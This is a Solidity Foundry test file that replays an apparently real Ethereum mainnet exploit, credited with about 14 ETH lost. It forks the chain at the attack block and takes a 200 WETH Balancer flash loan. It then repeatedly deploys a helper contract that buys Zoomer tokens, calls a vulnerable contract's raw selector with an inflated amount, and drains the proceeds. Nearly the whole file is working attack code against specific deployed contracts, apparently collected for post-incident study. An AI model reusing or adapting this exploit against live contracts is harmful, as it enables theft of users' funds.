// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~14 ETH
// TX : https://app.blocksec.com/explorer/tx/eth/0x06d7e7436414c658a33452d28400799f3637e83930dcec39b3bd065dabc6ef04
// Attacker : https://etherscan.io/address/0xb0380b6d7a63e7cbf274c3b3c8838abbd6bd4abe
// Attack Contract : https://etherscan.io/address/0xa4854022f4c16f0abc3fdec300427f6179a3043b
// GUY : https://x.com/ChainAegis/status/1761246415488225668

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 Zoomer = IERC20(0x0D505C03d30e65f6e9b4Ef88855a47a89e4b7676);
    address Vulncontract=0x9700204D77A67A18eA8F1B47275897b21e5eFA97;
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Money HackContract ;
    function setUp() external {
        cheats.createSelectFork("mainnet", 19291249);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker ETH before exploit", address(this).balance, 18);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 200 ether;
        bytes memory userData = abi.encode(amounts,tokens,"test");
        Balancer.flashLoan(address(this), tokens, amounts, userData);
        emit log_named_decimal_uint("[Begin] Attacker ETH after exploit", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
          for (uint256 i; i < 5; ++i) {
            HackContract = new Money{value: 200 ether}();
            swap_token_to_ExactToken(Zoomer.balanceOf(address(this)), address(Zoomer), address(WETH), type(uint256).max);
        }
        WETH.transfer(address(msg.sender),200 ether);
    }

    function swap_token_to_ExactToken(uint256 amount,address a,address b,uint256 amountInMax) payable public {
        IERC20(a).approve(address(Router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokens(amount, 0,path, address(this), block.timestamp + 120);

    }
    fallback() external payable {}
}

contract Money is Test{
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 Zoomer = IERC20(0x0D505C03d30e65f6e9b4Ef88855a47a89e4b7676);
    address Vulncontract=0x9700204D77A67A18eA8F1B47275897b21e5eFA97;
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address owner;
    constructor() payable {
        owner = msg.sender;
        Attack();
    }

    function Attack() public payable {
        require(owner==msg.sender,"Error");
        swap_token_to_ExactToken(199.9 ether, address(WETH), address(Zoomer), type(uint256).max);
        Zoomer.approve(address(Vulncontract),type(uint256).max);
        address(Vulncontract).call{value: 0.02 ether}(abi.encodeWithSelector(bytes4(0x72c4cff6),address(Zoomer),30265400 ether));
        Zoomer.transfer(address(msg.sender),Zoomer.balanceOf(address(this)));
        (msg.sender).call{value: address(this).balance}("");        
    }
    function swap_token_to_ExactToken(uint256 amount,address a,address b,uint256 amountInMax) payable public {
        IERC20(a).approve(address(Router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactETHForTokens{value: amount}(0, path, address(this), block.timestamp);

    }
    fallback() external payable {}
}